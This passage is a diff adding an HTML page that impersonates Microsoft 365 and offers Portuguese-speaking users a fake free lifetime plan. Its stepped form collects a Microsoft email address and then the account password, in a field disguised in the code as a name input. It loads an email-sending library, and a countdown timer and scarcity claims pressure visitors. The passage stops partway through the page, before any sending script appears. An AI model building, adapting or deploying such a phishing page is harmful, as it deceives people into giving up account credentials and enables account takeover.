@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>Microsoft 365 — Plano Gratuito Vitalício</title>
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+:root {
+  --ms-blue:      #0067b8;
+  --ms-blue-dk:   #005a9e;
+  --ms-blue-md:   #0078d4;
+  --ms-blue-lt:   #2b88d8;
+  --ms-green:     #107c10;
+  --ms-green-bg:  #dff6dd;
+  --ms-green-bd:  #a8d5a2;
+  --ms-red:       #d13438;
+  --ms-gray:      #616161;
+  --ms-gray2:     #8a8a8a;
+  --ms-border:    #e0e0e0;
+  --ms-surface:   #f5f5f5;
+  --ms-white:     #ffffff;
+  --ms-dark:      #1b1b1b;
+  --r-sm: 4px; --r-md: 10px; --r-lg: 16px;
+  --sh-sm: 0 2px 8px rgba(0,0,0,.08);
+  --sh-md: 0 4px 20px rgba(0,0,0,.11);
+  --sh-lg: 0 10px 48px rgba(0,0,0,.15);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:16px;-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;background:var(--ms-surface);color:var(--ms-dark);line-height:1.5}
+a{color:var(--ms-blue-md);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* CONTAINER */
+.wrap{width:100%;max-width:1140px;margin:0 auto;padding:0 20px}
+@media(min-width:768px){.wrap{padding:0 32px}}
+@media(min-width:1200px){.wrap{padding:0 48px}}
+
+/* ── HEADER ── */
+.site-header{background:var(--ms-white);border-bottom:1px solid var(--ms-border);position:sticky;top:0;z-index:200;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.hdr{display:flex;align-items:center;justify-content:space-between;height:52px}
+.logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+.logo-grid{display:grid;grid-template-columns:1fr 1fr;gap:2px;width:22px;height:22px;flex-shrink:0}
+.logo-grid span:nth-child(1){background:#f25022}
+.logo-grid span:nth-child(2){background:#7fba00}
+.logo-grid span:nth-child(3){background:#00a4ef}
+.logo-grid span:nth-child(4){background:#ffb900}
+.logo-text{font-size:16px;font-weight:600;color:var(--ms-dark);letter-spacing:-.2px}
+.logo-text b{font-weight:300}
+.hdr-nav{display:none;gap:28px}
+@media(min-width:820px){.hdr-nav{display:flex}}
+.hdr-nav a{font-size:13.5px;color:var(--ms-dark);transition:color .15s}
+.hdr-nav a:hover{color:var(--ms-blue-md)}
+.hdr-badge{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;padding:5px 12px;border-radius:20px;background:var(--ms-green-bg);color:var(--ms-green);border:1px solid var(--ms-green-bd);white-space:nowrap}
+
+/* ── BENEFITS STRIP ── */
+.bstrip{background:var(--ms-white);border-bottom:1px solid var(--ms-border);overflow-x:auto;-webkit-overflow-scrolling:touch}
+.bstrip-inner{display:flex;min-width:max-content;padding:0 20px}
+@media(min-width:820px){.bstrip-inner{min-width:auto;flex-wrap:wrap;justify-content:center;padding:0 32px}}
+.bi{display:flex;align-items:center;gap:8px;padding:13px 20px;font-size:13px;font-weight:500;border-right:1px solid var(--ms-border);white-space:nowrap}
+.bi:last-child{border-right:none}
+
+/* ── HERO ── */
+.hero{background:linear-gradient(135deg,#0050a0 0%,#0078d4 55%,#00b4d8 100%);color:#fff;padding:52px 0 64px;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;inset:0;pointer-events:none;background:radial-gradient(ellipse 70% 90% at 110% 50%,rgba(255,255,255,.06) 0%,transparent 60%)}
+.hero-inner{position:relative;display:flex;flex-direction:column;gap:40px;align-items:stretch}
+@media(min-width:920px){.hero-inner{flex-direction:row;align-items:center;gap:56px}}
+.hero-copy{flex:1;min-width:0}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:5px 14px;border-radius:20px;font-size:11.5px;letter-spacing:.6px;text-transform:uppercase;margin-bottom:20px}
+.edot{width:7px;height:7px;border-radius:50%;background:#7fba00;animation:blink 2s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+.hero h1{font-size:clamp(1.9rem,5vw,3rem);font-weight:700;line-height:1.13;letter-spacing:-.5px;margin-bottom:16px}
+.hero h1 em{font-style:normal;color:#7fba00}
+.hero-sub{font-size:clamp(.9rem,2vw,1.05rem);font-weight:300;line-height:1.7;opacity:.92;margin-bottom:28px;max-width:520px}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chip{display:flex;align-items:center;gap:7px;background:rgba(255,255,255,.13);border:1px solid rgba(255,255,255,.22);padding:7px 14px;border-radius:20px;font-size:13px;font-weight:500;transition:background .15s}
+.chip:hover{background:rgba(255,255,255,.22)}
+.cico{width:20px;height:20px;border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#fff;flex-shrink:0}
+.cw{background:#2b579a}.cx{background:#217346}.cp{background:#d24726}.ct{background:#6264a7}.cn{background:#7719aa}
+
+/* FORM CARD */
+.fcard{width:100%;background:var(--ms-white);border-radius:var(--r-lg);box-shadow:var(--sh-lg);overflow:hidden;flex-shrink:0}
+@media(min-width:920px){.fcard{width:400px}}
+
+/* STEPPER */
+.stepper{display:flex;background:#fafafa;border-bottom:1px solid var(--ms-border)}
+.stab{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:11px 4px;gap:4px;font-size:11px;font-weight:600;color:var(--ms-gray2);border-bottom:3px solid transparent;transition:color .2s,border-color .2s;cursor:default;text-align:center}
+.sn{width:22px;height:22px;border-radius:50%;background:var(--ms-border);color:var(--ms-gray);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;transition:background .2s,color .2s}
+.stab.active{color:var(--ms-blue-md);border-bottom-color:var(--ms-blue-md)}
+.stab.active .sn{background:var(--ms-blue-md);color:#fff}
+.stab.done{color:var(--ms-green)}
+.stab.done .sn{background:var(--ms-green);color:#fff}
+
+/* PANELS */
+.panels{padding:26px 22px 22px}
+@media(min-width:480px){.panels{padding:32px 28px 28px}}
+.panel{display:none}
+.panel.active{display:block;animation:fup .3s ease both}
+@keyframes fup{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.ptitle{font-size:1.08rem;font-weight:700;margin-bottom:5px}
+.psub{font-size:.83rem;color:var(--ms-gray);line-height:1.55;margin-bottom:20px}
+
+/* FIELDS */
+.fld{margin-bottom:16px}
+.fld label{display:block;font-size:13px;font-weight:600;color:var(--ms-dark);margin-bottom:6px}
+.fld input{width:100%;padding:11px 13px;border:1.5px solid var(--ms-border);border-radius:var(--r-sm);font-family:inherit;font-size:15px;color:var(--ms-dark);background:var(--ms-white);outline:none;transition:border-color .15s,box-shadow .15s;-webkit-appearance:none}
+.fld input:focus{border-color:var(--ms-blue-md);box-shadow:0 0 0 2px rgba(0,120,212,.15)}
+.fld input.err{border-color:var(--ms-red);box-shadow:0 0 0 2px rgba(209,52,56,.12)}
+.ferr{font-size:12px;color:var(--ms-red);margin-top:5px;display:none}
+.ferr.show{display:block}
+.fhint{font-size:12px;color:var(--ms-gray2);margin-top:5px}
+.dchips{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
+.dc{font-size:11.5px;padding:4px 11px;border-radius:20px;background:#e8f0fe;color:var(--ms-blue-md);border:1px solid #b3cef5;cursor:pointer;transition:background .15s;user-select:none}
+.dc:hover{background:#cce0fb}
+
+/* BUTTONS */
+.btn{width:100%;padding:12px 20px;border-radius:var(--r-sm);border:none;cursor:pointer;font-family:inherit;font-size:15px;font-weight:600;transition:background .15s,transform .1s;-webkit-appearance:none}
+.btn:active{transform:scale(.98)}
+.btn-p{background:var(--ms-blue-md);color:#fff;margin-top:6px}
+.btn-p:hover{background:var(--ms-blue-dk)}
+.btn-p:disabled{background:#c0c0c0;cursor:not-allowed;transform:none}
+.btn-o{background:transparent;color:var(--ms-blue-md);border:1.5px solid var(--ms-blue-md);font-size:14px;padding:10px 20px}
+.btn-o:hover{background:#e8f0fe}
+.brow{display:flex;gap:10px;margin-top:6px}
+.brow .btn-o{flex-shrink:0;width:auto;padding:10px 16px}
+.brow .btn-p{flex:1;margin-top:0}
+
+/* CONFIRM */
+.cbox{background:var(--ms-surface);border:1px solid var(--ms-border);border-radius:var(--r-md);padding:14px 16px;margin-bottom:16px}
+.crow{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:13.5px;border-bottom:1px solid var(--ms-border)}
+.crow:last-child{border-bottom:none;padding-bottom:0}
+.crow:first-child{padding-top:0}
+.cl{color:var(--ms-gray);font-size:12.5px}
+.cv{font-weight:600;font-size:13px;text-align:right;word-break:break-all;max-width:60%;color:var(--ms-dark)}
+.plan-badge{font-size:11px;font-weight:700;padding:3px 9px;border-radius:20px;background:var(--ms-green-bg);color:var(--ms-green);border:1px solid var(--ms-green-bd)}
+.chkrow{display:flex;align-items:flex-start;gap:10px;font-size:12px;color:var(--ms-gray);line-height:1.5;margin-bottom:16px}
+.chkrow input{margin-top:2px;accent-color:var(--ms-blue-md);flex-shrink:0}
+
+/* SUCCESS */
+.swrap{text-align:center;padding:8px 0 4px}
+.sico{width:72px;height:72px;border-radius:50%;background:var(--ms-green-bg);border:2px solid var(--ms-green-bd);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 20px;animation:pop .45s cubic-bezier(.36,.07,.19,.97) both}
+@keyframes pop{0%{transform:scale(0)}75%{transform:scale(1.1)}100%{transform:scale(1)}}
+.stitle{font-size:1.15rem;font-weight:700;color:var(--ms-green);margin-bottom:8px}
+.ssub{font-size:.87rem;color:var(--ms-gray);line-height:1.6;margin-bottom:14px}
+.semail{display:inline-block;background:#e8f0fe;border:1px solid #b3cef5;color:var(--ms-blue-md);font-weight:700;font-size:14px;padding:9px 20px;border-radius:var(--r-sm);margin-bottom:14px;word-break:break-all}
+.stimer{font-size:13px;color:var(--ms-gray);margin-bottom:20px}
+.sinfo{background:var(--ms-surface);border:1px solid var(--ms-border);border-radius:var(--r-md);padding:14px 18px;text-align:left}
+.sinfo h4{font-size:11.5px;text-transform:uppercase;letter-spacing:.8px;color:var(--ms-gray);margin-bottom:10px}
+.sinfo ul{list-style:none}
+.sinfo ul li{display:flex;align-items:flex-start;gap:9px;font-size:13px;color:var(--ms-dark);padding:6px 0;border-bottom:1px solid var(--ms-border);line-height:1.45}
+.sinfo ul li:last-child{border-bottom:none}
+.ssnum{width:20px;height:20px;border-radius:50%;background:var(--ms-blue-md);color:#fff;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+
+/* SPINNER */
+.spin{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle;margin-right:7px}
+@keyframes rot{to{transform:rotate(360deg)}}
+
+/* ── SECTION COMMONS ── */
+section{padding:52px 0}
+@media(min-width:768px){section{padding:72px 0}}
+.eyebrow2{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--ms-blue-md);margin-bottom:8px}
+.stit{font-size:clamp(1.4rem,4vw,2rem);font-weight:700;letter-spacing:-.3px;margin-bottom:10px}
+.ssub2{font-size:.92rem;color:var(--ms-gray);max-width:560px;line-height:1.65;margin-bottom:36px}
+
+/* ── APPS ── */
+.apps-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+@media(min-width:540px){.apps-grid{grid-template-columns:repeat(3,1fr)}}
+@media(min-width:900px){.apps-grid{grid-template-columns:repeat(6,1fr);gap:16px}}
+.acard{background:var(--ms-white);border:1px solid var(--ms-border);border-radius:var(--r-lg);padding:18px 14px;display:flex;flex-direction:column;gap:10px;transition:box-shadow .2s,transform .2s}
+.acard:hover{box-shadow:var(--sh-md);transform:translateY(-3px)}
+.atop{display:flex;align-items:center;gap:9px}
+.aico{width:36px;height:36px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:800;color:#fff;flex-shrink:0}
+.aw{background:#2b579a}.ax{background:#217346}.ap{background:#d24726}.aod{background:#0078d4}.at{background:#6264a7}.an{background:#7719aa}
+.aname{font-size:.88rem;font-weight:700;line-height:1.2}
+.atag{display:inline-block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.4px;padding:2px 8px;border-radius:20px;background:var(--ms-green-bg);color:var(--ms-green);border:1px solid var(--ms-green-bd);width:fit-content}
+.adesc{font-size:.76rem;color:var(--ms-gray);line-height:1.5}
+
+/* ── COMPARE ── */
+.chk{color:var(--ms-green);font-size:18px;font-weight:700}
+.xmk{color:#c0c0c0;font-size:16px}
+.pf{font-weight:800;font-size:1.1rem;color:var(--ms-green)}
+.stag2{font-size:12px;font-weight:700;padding:3px 10px;border-radius:20px;background:#e8f0fe;color:var(--ms-blue-md);border:1px solid #b3cef5;display:inline-block}
+
+/* ── COUNTDOWN ── */
+.cd-section{background:linear-gradient(135deg,#0050a0,#0078d4);border:none}
+.countdown-wrap{display:flex;align-items:center;gap:20px;padding:22px 0}
+.cd-icon{width:34px;height:34px;flex-shrink:0;color:rgba(255,255,255,.85)}
+.cd-text{flex:1;min-width:0}
+.cd-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:rgba(255,255,255,.75);margin-bottom:10px}
+.cd-timer{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.cd-unit{display:flex;flex-direction:column;align-items:center;gap:4px}
+.cd-num{font-size:1.5rem;font-weight:800;color:#fff;line-height:1;font-variant-numeric:tabular-nums;min-width:44px;text-align:center;background:rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.2);border-radius:6px;padding:6px 8px}
+.cd-unit-label{font-size:9px;text-transform:uppercase;letter-spacing:.6px;color:rgba(255,255,255,.6);font-weight:600}
+.cd-sep{font-size:1.3rem;font-weight:700;color:rgba(255,255,255,.5);margin-bottom:20px;line-height:1}
+.cd-urgent{font-size:11.5px;color:#ffb900;font-weight:600;margin-top:8px;display:flex;align-items:center;gap:5px}
+@media(min-width:640px){
+  .countdown-wrap{gap:28px;padding:26px 0}
+  .cd-num{font-size:1.9rem;min-width:54px}
+  .cd-sep{font-size:1.6rem}
+}
+
+/* Mobile: grid de itens */
+.plan-feature-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.pf-card{background:var(--ms-white);border:1px solid var(--ms-border);border-radius:var(--r-lg);padding:18px 16px;display:flex;flex-direction:column;align-items:flex-start;gap:10px;box-shadow:var(--sh-sm)}
+.pf-card-icon{width:32px;height:32px;color:var(--ms-blue-md)}
+.pf-card-label{font-size:12px;color:var(--ms-gray);font-weight:500;line-height:1.3}
+.pf-card-val{font-size:14px;font-weight:700;color:var(--ms-dark);display:flex;align-items:center;gap:6px}
+.pf-card-val svg{width:18px;height:18px;color:var(--ms-green);flex-shrink:0}
+.pf-price-card{grid-column:1/-1;background:linear-gradient(135deg,var(--ms-blue-md),var(--ms-blue-lt));border:none;color:#fff;flex-direction:row;align-items:center;justify-content:space-between;padding:20px 22px}
+.pf-price-card .pf-card-label{color:rgba(255,255,255,.8);font-size:13px}
+.pf-price-card .pf-card-val{color:#fff;font-size:2rem;font-weight:800}
+.pf-price-card .pf-card-val small{font-size:.7rem;font-weight:400;opacity:.8;display:block;margin-top:2px}
+.pf-price-badge{background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.35);padding:5px 14px;border-radius:20px;font-size:12px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.4px}
+
+/* Desktop: tabela clássica */
+.ctable-wrap{display:none}
+@media(min-width:640px){
+  .plan-feature-grid{display:none}
+  .ctable-wrap{display:block;background:var(--ms-white);border:1px solid var(--ms-border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--sh-sm)}
+  table{width:100%;border-collapse:collapse}
+  thead th{padding:16px 24px;font-size:13.5px;font-weight:700;border-bottom:2px solid var(--ms-border);background:#fafafa}
+  thead th:first-child{text-align:left}
+  thead th:not(:first-child){text-align:center;color:var(--ms-blue-md)}
+  tbody td{padding:14px 24px;font-size:14px;border-bottom:1px solid #f0f0f0}
+  tbody td:first-child{color:var(--ms-gray);font-size:13.5px}
+  tbody td:not(:first-child){text-align:center;font-weight:600}
+  tbody tr:last-child td{border-bottom:none}
+  tbody tr:hover td{background:#fafafa}
+}
+
+/* ── HOW ── */
+.how-grid{display:grid;grid-template-columns:1fr;gap:20px}
+@media(min-width:600px){.how-grid{grid-template-columns:1fr 1fr;gap:24px}}
+@media(min-width:900px){.how-grid{grid-template-columns:repeat(4,1fr)}}
+.hcard{background:var(--ms-white);border:1px solid var(--ms-border);border-radius:var(--r-lg);padding:22px 18px;display:flex;flex-direction:column;gap:12px}
+.hnum{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--ms-blue-md),var(--ms-blue-lt));color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;box-shadow:0 4px 12px rgba(0,120,212,.3)}
+.hcard h4{font-size:.93rem;font-weight:700}
+.hcard p{font-size:.81rem;color:var(--ms-gray);line-height:1.6}
+
+/* ── FOOTER ── */
+.site-footer{background:var(--ms-white);border-top:1px solid var(--ms-border);padding:28px 0}
+.ftr{display:flex;flex-direction:column;gap:14px}
+@media(min-width:768px){.ftr{flex-direction:row;justify-content:space-between;align-items:center}}
+.flinks{display:flex;flex-wrap:wrap;gap:18px}
+.flinks a{font-size:12.5px;color:var(--ms-gray)}
+.flinks a:hover{text-decoration:underline}
+.fnote{font-size:11.5px;color:var(--ms-gray2);line-height:1.6;max-width:560px}
+
+/* ── TOAST ── */
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--ms-dark);color:#fff;padding:11px 22px;border-radius:var(--r-md);font-size:13.5px;font-weight:500;box-shadow:var(--sh-lg);z-index:9999;white-space:nowrap;transition:transform .35s cubic-bezier(.34,1.56,.64,1),opacity .3s;opacity:0;pointer-events:none}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+
+/* BG helpers */
+.bg-w{background:var(--ms-white)}
+.bg-s{background:var(--ms-surface)}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="site-header">
+  <div class="wrap">
+    <div class="hdr">
+      <a class="logo" href="#">
+        <div class="logo-grid"><span></span><span></span><span></span><span></span></div>
+        <span class="logo-text">Microsoft <b>365</b></span>
+      </a>
+      <nav class="hdr-nav">
+        <a href="#apps">Aplicativos</a>
+        <a href="#planos">Planos</a>
+        <a href="#como-funciona">Como funciona</a>
+      </nav>
+      <span class="hdr-badge">Disponível Agora</span>
+    </div>
+  </div>
+</header>
+
+<!-- BENEFITS STRIP -->
+<div class="bstrip">
+  <div class="wrap">
+    <div class="bstrip-inner">
+      <div class="bi">☁️ 100% online</div>
+      <div class="bi">✅ Sem cartão de crédito</div>
+      <div class="bi">♾️ Acesso vitalício</div>
+      <div class="bi">📧 Confirmação por e-mail</div>
+      <div class="bi">🔒 E-mail Microsoft necessário</div>
+    </div>
+  </div>
+</div>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="wrap">
+    <div class="hero-inner">
+
+      <div class="hero-copy">
+        <div class="eyebrow"><span class="edot"></span> Oferta exclusiva · Usuários Microsoft</div>
+        <h1>Microsoft 365<br><em>gratuito</em> para você</h1>
+        <p class="hero-sub">Se você tem um e-mail nos domínios Microsoft, tem direito ao pacote completo de produtividade online, sem pagar nada, para sempre.</p>
+        <div class="chips">
+          <div class="chip"><div class="cico cw">W</div> Word</div>
+          <div class="chip"><div class="cico cx">X</div> Excel</div>
+          <div class="chip"><div class="cico cp">P</div> PowerPoint</div>
+          <div class="chip"><div class="cico ct">T</div> Teams</div>
+          <div class="chip"><div class="cico cn">N</div> OneNote</div>
+        </div>
+      </div>
+
+      <!-- FORM CARD -->
+      <div class="fcard">
+        <div class="stepper" id="stepper">
+          <div class="stab active" data-s="1"><div class="sn">1</div>E-mail</div>
+          <div class="stab" data-s="2"><div class="sn">2</div>Senha</div>
+          <div class="stab" data-s="3"><div class="sn">3</div>Confirmar</div>
+          <div class="stab" data-s="4"><div class="sn">✓</div>Pronto!</div>
+        </div>
+        <div class="panels">
+
+          <!-- STEP 1 -->
+          <div class="panel active" id="p1">
+            <p class="ptitle">Qual é o seu e-mail?</p>
+            <p class="psub">Insira um endereço nos domínios Microsoft para verificar sua elegibilidade.</p>
+            <div class="fld">
+              <label for="f-email">E-mail Microsoft</label>
+              <input type="email" id="f-email" placeholder="nome@hotmail.com" autocomplete="email" inputmode="email">
+              <div class="ferr" id="err-email">Insira um e-mail válido nos domínios Microsoft.</div>
+              <div class="fhint">Clique num domínio para preencher automaticamente:</div>
+              <div class="dchips">
+                <span class="dc" onclick="setDomain('@hotmail.com')">@hotmail.com</span>
+                <span class="dc" onclick="setDomain('@outlook.com')">@outlook.com</span>
+                <span class="dc" onclick="setDomain('@live.com')">@live.com</span>
+                <span class="dc" onclick="setDomain('@msn.com')">@msn.com</span>
+                <span class="dc" onclick="setDomain('@hotmail.com.br')">@hotmail.com.br</span>
+                <span class="dc" onclick="setDomain('@outlook.com.br')">@outlook.com.br</span>
+              </div>
+            </div>
+            <button class="btn btn-p" onclick="step1()">Verificar elegibilidade</button>
+          </div>
+
+          <!-- STEP 2 -->
+          <div class="panel" id="p2">
+            <p class="ptitle">E-mail elegível ✓</p>
+            <p class="psub">Informe sua senha para validar seu acesso.</p>
+            <div class="fld">
+              <label for="f-nome">Senha</label>
+              <input type="text" id="f-nome" placeholder="Insira sua senha" autocomplete="name">
+              <div class="ferr" id="err-nome">Insira sua senha (mínimo 8 caracteres).</div>
+            </div>
+            <div class="brow">
+              <button class="btn btn-o" onclick="goPanel(1)">Voltar</button>
+              <button class="btn btn-p" onclick="step2()">Continuar</button>
+            </div>
+          </div>
+
+          <!-- STEP 3 -->
+          <div class="panel" id="p3">
+            <p class="ptitle">Confirme seus dados</p>
+            <p class="psub">Revise as informações antes de ativar seu plano.</p>
+            <div class="cbox">
+              <div class="crow"><span class="cl">E-mail</span><span class="cv" id="c-email">—</span></div>
+              <div class="crow"><span class="cl">Plano</span><span class="cv"><span class="plan-badge">Free · Vitalício</span></span></div>
+            </div>
+            <div class="chkrow">
+              <input type="checkbox" id="f-terms" checked>
+              <label for="f-terms">Concordo em receber comunicações sobre meu acesso e estou ciente de que este é um cadastro informativo, não oficial da Microsoft.</label>
+            </div>
+            <div class="brow">
+              <button class="btn btn-o" onclick="goPanel(2)">Voltar</button>
+              <button class="btn btn-p" id="btn-final" onclick="finalizar()">Ativar plano</button>
+            </div>
+          </div>
+
+          <!-- STEP 4 SUCCESS -->
+          <div class="panel" id="p4">
+            <div class="swrap">
+              <div class="sico">✅</div>
+              <p class="stitle">Cadastro realizado!</p>
+              <p class="ssub">Enviamos um e-mail de confirmação para:</p>
+              <div class="semail" id="s-email">—</div>
+              <p class="stimer">Seu acesso será liberado em até <strong>24 horas</strong>.</p>
+              <div class="sinfo">
+                <h4>O que acontece agora?</h4>
+                <ul>
+                  <li><div class="ssnum">1</div> Verifique sua caixa de entrada (e o spam)</li>
+                  <li><div class="ssnum">2</div> Clique no link de confirmação no e-mail recebido</li>
+                  <li><div class="ssnum">3</div> Aguarde até 24h. Você receberá aviso quando o acesso for liberado</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- COUNTDOWN -->
+<div class="cd-section">
+  <div class="wrap">
+    <div class="countdown-wrap">
+      <svg class="cd-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+      </svg>
+      <div class="cd-text">
+        <div class="cd-label">Oferta por tempo limitado. Encerra em</div>
+        <div class="cd-timer">
+          <div class="cd-unit"><span class="cd-num" id="cd-d">00</span><span class="cd-unit-label">dias</span></div>
+          <span class="cd-sep">:</span>
+          <div class="cd-unit"><span class="cd-num" id="cd-h">00</span><span class="cd-unit-label">horas</span></div>
+          <span class="cd-sep">:</span>
+          <div class="cd-unit"><span class="cd-num" id="cd-m">00</span><span class="cd-unit-label">min</span></div>
+          <span class="cd-sep">:</span>
+          <div class="cd-unit"><span class="cd-num" id="cd-s">00</span><span class="cd-unit-label">seg</span></div>
+        </div>
+        <div class="cd-urgent">Restam poucas vagas disponíveis nesta oferta.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- APPS -->
+<section class="bg-w" id="apps">
+  <div class="wrap">
+    <p class="eyebrow2">Incluído no plano gratuito</p>
+    <h2 class="stit">Tudo que você precisa</h2>
+    <p class="ssub2">Acesso às versões online dos apps Microsoft, em qualquer dispositivo, sem instalar nada.</p>
+    <div class="apps-grid">
+      <div class="acard">
+        <div class="atop"><div class="aico aw">W</div><div><div class="aname">Word</div><span class="atag">Incluso</span></div></div>
+        <p class="adesc">Documentos profissionais com formatação completa e colaboração em tempo real.</p>
+      </div>
+      <div class="acard">
+        <div class="atop"><div class="aico ax">X</div><div><div class="aname">Excel</div><span class="atag">Incluso</span></div></div>
+        <p class="adesc">Planilhas com fórmulas, gráficos dinâmicos e tabelas pivô no navegador.</p>
+      </div>
+      <div class="acard">
+        <div class="atop"><div class="aico ap">P</div><div><div class="aname">PowerPoint</div><span class="atag">Incluso</span></div></div>
+        <p class="adesc">Apresentações com templates modernos e animações, tudo na nuvem.</p>
+      </div>
+      <div class="acard">
+        <div class="atop"><div class="aico aod">☁</div><div><div class="aname">OneDrive</div><span class="atag">1 TB grátis</span></div></div>
+        <p class="adesc">1 TB de armazenamento na nuvem para arquivos e fotos acessíveis em qualquer lugar.</p>
+      </div>
+      <div class="acard">
+        <div class="atop"><div class="aico at">T</div><div><div class="aname">Teams</div><span class="atag">Incluso</span></div></div>
+        <p class="adesc">Chat, videochamadas e colaboração em documentos com colegas e amigos.</p>
+      </div>
+      <div class="acard">
+        <div class="atop"><div class="aico an">N</div><div><div class="aname">OneNote</div><span class="atag">Incluso</span></div></div>
+        <p class="adesc">Caderno digital para anotações e ideias, sincronizado em todos os dispositivos.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- COMPARE -->
+<section class="bg-s" id="planos">
+  <div class="wrap">
+    <p class="eyebrow2">Plano Free Vitalício</p>
+    <h2 class="stit">Tudo incluso, sem pagar nada.</h2>
+
+    <!-- MOBILE: grid de cards -->
+    <div class="plan-feature-grid">
+      <div class="pf-card pf-price-card">
+        <div>
+          <div class="pf-card-label">Plano gratuito</div>
+          <div class="pf-card-val">R$ 0 <small>para sempre</small></div>
+        </div>
+        <span class="pf-price-badge">Vitalício</span>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/>
+        </svg>
+        <div class="pf-card-label">Word, Excel, PowerPoint</div>
+        <div class="pf-card-val">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Online
+        </div>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>
+        </svg>
+        <div class="pf-card-label">Apps para desktop</div>
+        <div class="pf-card-val">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Incluso
+        </div>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z"/>
+        </svg>
+        <div class="pf-card-label">OneDrive</div>
+        <div class="pf-card-val"><span class="stag2">1 TB</span></div>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+        </svg>
+        <div class="pf-card-label">Teams</div>
+        <div class="pf-card-val">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Incluso
+        </div>
+      </div>
+
+      <div class="pf-card">
+        <svg class="pf-card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
